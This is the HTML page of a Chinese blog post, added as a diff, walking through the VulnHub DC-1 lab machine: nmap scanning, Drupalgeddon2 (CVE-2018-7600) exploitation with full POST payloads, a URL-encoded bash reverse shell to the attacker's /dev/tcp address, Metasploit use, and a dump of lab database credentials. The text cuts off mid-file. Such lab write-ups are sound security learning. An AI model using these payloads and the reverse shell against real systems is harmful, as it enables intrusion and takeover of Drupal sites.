@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>VulnHub_DC-1靶机渗透测试学习 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub_DC-1靶机渗透测试学习</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-06-20&nbsp;&nbsp;0:08:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个靶机是 <a href="https://twitter.com/@DCAU7" target="_blank" rel="noopener">@DCAU7</a> 出品的系列靶机<a href="https://www.vulnhub.com/series/dc,199/" target="_blank" rel="noopener">DC</a>中的第一个，整个系列一共有9个靶机，希望能够有时间，把9个靶机都做一遍。</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/3.png" alt="3"></p>
+<p>第一个靶机一共有5个flag，最后一个flag在<code>/root</code>目录下。目标就是找到并读取这5个flag。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>第一步先确定目标主机ip地址，用nmap扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -sP 192.168.247.1/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 08:29 EDT</span><br><span class="line">Nmap scan report for 192.168.247.1</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Nmap scan report for 192.168.247.2</span><br><span class="line">Host is up (0.00054s latency).</span><br><span class="line">Nmap scan report for 192.168.247.210</span><br><span class="line">Host is up (0.0023s latency).</span><br><span class="line">Nmap scan report for 192.168.247.214</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 2.64 seconds</span><br></pre></td></tr></table></figure>
+
+<p><code>192.168.247.210</code>是攻击机kali的地址，所以目标主机地址为<code>192.168.247.214</code>。</p>
+<p>扫描端口，确定目标主机开启了哪些服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -p1-65535 -A 192.168.247.214 -oN /tmp/DC-1.txt</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 08:29 EDT</span><br><span class="line">Nmap scan report for 192.168.247.214</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          33032/tcp   status</span><br><span class="line">|   100024  1          39430/tcp6  status</span><br><span class="line">|   100024  1          48263/udp6  status</span><br><span class="line">|_  100024  1          52110/udp   status</span><br><span class="line">33032/tcp open  status  1 (RPC #100024)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 16.18 seconds</span><br></pre></td></tr></table></figure>
+
+<p>目标主机上开放了三个服务。前两个都已经很熟悉了，对于第三个<code>rpcbind</code>服务，这是一个文件共享服务，这个服务也存在一些漏洞，后面可以看看能不能从这里攻入。</p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>因为开启了apache服务，所以我们先访问一下该网站，打开网页，发现是一个Drupal站点：</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/1.png" alt="1"></p>
+<p>因为是一个登录页面，用最简单的密码尝试，比如<code>admin:admin</code>或是<code>admin:123456</code>，但是都不对。</p>
+<p>不过从前面nmap的扫描结果还是暴露出了比较关键的一些信息：</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/2.png" alt="2"></p>
+<p>主要有两个点：1. 当前的Drupal版本是<strong>7.*</strong>，但是更具体的没有了；2. <code>robots.txt</code>中禁掉了一些搜索引擎会爬取的页面。</p>
+<p>访问<code>http://192.168.247.214/robots.txt</code>得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># robots.txt</span><br><span class="line">#</span><br><span class="line"># This file is to prevent the crawling and indexing of certain parts</span><br><span class="line"># of your site by web crawlers and spiders run by sites like Yahoo!</span><br><span class="line"># and Google. By telling these &quot;robots&quot; where not to go on your site,</span><br><span class="line"># you save bandwidth and server resources.</span><br><span class="line">#</span><br><span class="line"># This file will be ignored unless it is at the root of your host:</span><br><span class="line"># Used:    http:&#x2F;&#x2F;example.com&#x2F;robots.txt</span><br><span class="line"># Ignored: http:&#x2F;&#x2F;example.com&#x2F;site&#x2F;robots.txt</span><br><span class="line">#</span><br><span class="line"># For more information about the robots.txt standard, see:</span><br><span class="line"># http:&#x2F;&#x2F;www.robotstxt.org&#x2F;wc&#x2F;robots.html</span><br><span class="line">#</span><br><span class="line"># For syntax checking, see:</span><br><span class="line"># http:&#x2F;&#x2F;www.sxw.org.uk&#x2F;computing&#x2F;robots&#x2F;check.html</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: &#x2F;includes&#x2F;</span><br><span class="line">Disallow: &#x2F;misc&#x2F;</span><br><span class="line">Disallow: &#x2F;modules&#x2F;</span><br><span class="line">Disallow: &#x2F;profiles&#x2F;</span><br><span class="line">Disallow: &#x2F;scripts&#x2F;</span><br><span class="line">Disallow: &#x2F;themes&#x2F;</span><br><span class="line"># Files</span><br><span class="line">Disallow: &#x2F;CHANGELOG.txt</span><br><span class="line">Disallow: &#x2F;cron.php</span><br><span class="line">Disallow: &#x2F;INSTALL.mysql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.pgsql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.sqlite.txt</span><br><span class="line">Disallow: &#x2F;install.php</span><br><span class="line">Disallow: &#x2F;INSTALL.txt</span><br><span class="line">Disallow: &#x2F;LICENSE.txt</span><br><span class="line">Disallow: &#x2F;MAINTAINERS.txt</span><br><span class="line">Disallow: &#x2F;update.php</span><br><span class="line">Disallow: &#x2F;UPGRADE.txt</span><br><span class="line">Disallow: &#x2F;xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: &#x2F;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;search&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;logout&#x2F;</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: &#x2F;?q&#x3D;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;search&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;logout&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>我访问了几个页面，有一些页面是需要登录才能访问的，比如<code>/?q=node/add/</code>。因为没事其他的思路，而且这个站点是知名站点，是爆出过很多漏洞的，所以一般这个时候有两种选择，第一个是网上搜索exp，找合适的exp进行攻击；另一种就是利用metasploit进行攻击。</p>
+<h3 id="法一：网络搜索EXP进行攻击"><a href="#法一：网络搜索EXP进行攻击" class="headerlink" title="法一：网络搜索EXP进行攻击"></a>法一：网络搜索EXP进行攻击</h3><p>该站点是基于Drupal站点，我们知道这个cms其实是爆出过一些知名漏洞的。但是因为无法登录，所以不能找那些需要授权的漏洞，目标是未授权漏洞，也就是无需登录即可触发的漏洞。</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/4.png" alt="4"></p>
+<p>就上面的截图就涉及了三个漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CVE-2014-3704</span><br><span class="line">CVE-2018-7600</span><br><span class="line">CVE-2019-6339</span><br></pre></td></tr></table></figure>
+
+<p>但是<code>CVE-2014-3704</code>和<code>CVE-2019-6339</code>都是需要管理员权限的，显然无法利用。但是，<code>CVE-2018-7600</code>不需要用户登录就可以执行代码，这个漏洞被叫做<code>drupalgeddon2</code>。具体的分析可以参考这篇文章：</p>
+<blockquote>
+<p> <a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/" target="_blank" rel="noopener">https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/</a> </p>
+</blockquote>
+<p>然后是利用方式，可以参考这篇文章，给出了Drupal <strong>8.*</strong> 版本和Drupal <strong>7.*</strong> 版本的利用方式：</p>
+<blockquote>
+<p> <a href="https://www.jianshu.com/p/7c410db788ed" target="_blank" rel="noopener">https://www.jianshu.com/p/7c410db788ed</a> </p>
+</blockquote>
+<p><strong>Drupal 7</strong>的利用方式和<strong>Drupal 8</strong>略有不同。漏洞的入口页面在<code>/?q=user/password</code>，这个页面是可以访问的，它的功能是申请新的密码。</p>
+<p>先发送第一个post请求，注入的命令是<code>system(&#39;whoami&#39;)</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?q&#x3D;user&#x2F;password&amp;name[%23post_render][]&#x3D;system&amp;name[%23markup]&#x3D;whoami&amp;name[%23type]&#x3D;markup HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.247.214</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.247.214&#x2F;?q&#x3D;user&#x2F;password&#x2F;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 47</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: has_js&#x3D;1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">form_id&#x3D;user_pass&amp;_triggering_element_name&#x3D;name</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/20/VulnHub_DC-1/5.png" alt="5"></p>
+<p>从response中得到<code>form_build_id</code>的值<code>form-6cDH7LuTJ10vfyrAsEeWUY15NG8nOA2tRmL-m6oCMtI</code>，这个值需要带入第2个post请求中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?q&#x3D;file&#x2F;ajax&#x2F;name&#x2F;%23value&#x2F;form-6cDH7LuTJ10vfyrAsEeWUY15NG8nOA2tRmL-m6oCMtI HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.247.214</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: has_js&#x3D;1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Wed, 17 Jun 2020 17:27:51 +0000</span><br><span class="line">If-None-Match: &quot;1592414871&quot;</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">form_build_id&#x3D;form-6cDH7LuTJ10vfyrAsEeWUY15NG8nOA2tRmL-m6oCMtI</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/20/VulnHub_DC-1/6.png" alt="6"></p>
+<p>成功执行了命令！</p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>通过反弹shell获得目标主机的进一步控制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.247.210&#x2F;23333 0&gt;&amp;1&quot; | bash</span><br></pre></td></tr></table></figure>
+
+<p>因为存在特殊字符和空格，url编码处理一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%65%63%68%6f%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%34%37%2e%32%31%30%2f%32%33%33%33%33%20%30%3e%26%31%22%20%7c%20%62%61%73%68</span><br></pre></td></tr></table></figure>
+
+<p>发送post请求1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?q&#x3D;user&#x2F;password&amp;name[%23post_render][]&#x3D;system&amp;name[%23markup]&#x3D;%65%63%68%6f%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%34%37%2e%32%31%30%2f%32%33%33%33%33%20%30%3e%26%31%22%20%7c%20%62%61%73%68&amp;name[%23type]&#x3D;markup HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.247.214</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.247.214&#x2F;?q&#x3D;user&#x2F;password&#x2F;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 47</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: has_js&#x3D;1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">form_id&#x3D;user_pass&amp;_triggering_element_name&#x3D;name</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/20/VulnHub_DC-1/7.png" alt="7"></p>
+<p>成功获得shell：</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/8.png" alt="8"></p>
+<h3 id="利用Metasploit获取shell"><a href="#利用Metasploit获取shell" class="headerlink" title="利用Metasploit获取shell"></a>利用Metasploit获取shell</h3><p>启动Metasploit，在新版kali中需要使用sudo：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfdb init &amp;&amp; msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>搜索可用的exp：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; searchsploit drupal</span><br></pre></td></tr></table></figure>
+
+<p> <code>searchsploit</code>只是在exploit-db数据库中搜索我们提供的关键字： </p>
+<p><img src="/2020/06/20/VulnHub_DC-1/9.png" alt="9"></p>
+<p>因为当前的版本是7，所以<code>php/webapps/44449.rb</code>应该是适用的，但是执行之后发现提示错误，原因是因为这个脚本中用了windows环境下的<code>\r</code>。。。这着实有点无语</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/10.png" alt="10"></p>
+<p>那直接看看metasploit中有没有什么攻击模块可以用的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search drupal</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/20/VulnHub_DC-1/11.png" alt="11"></p>
+<p>必填的参数是<code>RHOSTS</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOSTS 192.168.247.214</span><br><span class="line">RHOSTS =&gt; 192.168.247.214</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/20/VulnHub_DC-1/12.png" alt="12"></p>
+<p>随后进行exploit，在<code>meterpreter</code>会话中输入<code>shell</code>就能进入目标主机的shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/20/VulnHub_DC-1/13.png" alt="13"></p>
+<p>在当前目录下发现第一个flag文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ cat flag1.txt</span><br><span class="line">cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><code>/var/www/flag1.txt</code>给出的提示是去看网站的config文件，google一下就能知道config文件是<code>sites/default/settings.php</code>：</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/14.png" alt="14"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cd sites/default</span><br><span class="line">cd sites/default</span><br><span class="line">www-data@DC-1:/var/www/sites/default$ ls</span><br><span class="line">ls</span><br><span class="line">default.settings.php</span><br><span class="line">files</span><br><span class="line">settings.php</span><br></pre></td></tr></table></figure>
+
+<p>查看<code>settings.php</code>文件，发现<code>flag2</code>和数据库账号：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC<span class="number">-1</span>:/<span class="keyword">var</span>/www/sites/<span class="keyword">default</span>$ cat settings.php</span><br><span class="line">cat settings.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * flag2</span></span><br><span class="line"><span class="comment"> * Brute force and dictionary attacks aren't the</span></span><br><span class="line"><span class="comment"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="comment"> * What can you do with these credentials?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">$databases = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'default'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'default'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">'database'</span> =&gt; <span class="string">'drupaldb'</span>,</span><br><span class="line">      <span class="string">'username'</span> =&gt; <span class="string">'dbuser'</span>,</span><br><span class="line">      <span class="string">'password'</span> =&gt; <span class="string">'R0ck3t'</span>,</span><br><span class="line">      <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">      <span class="string">'port'</span> =&gt; 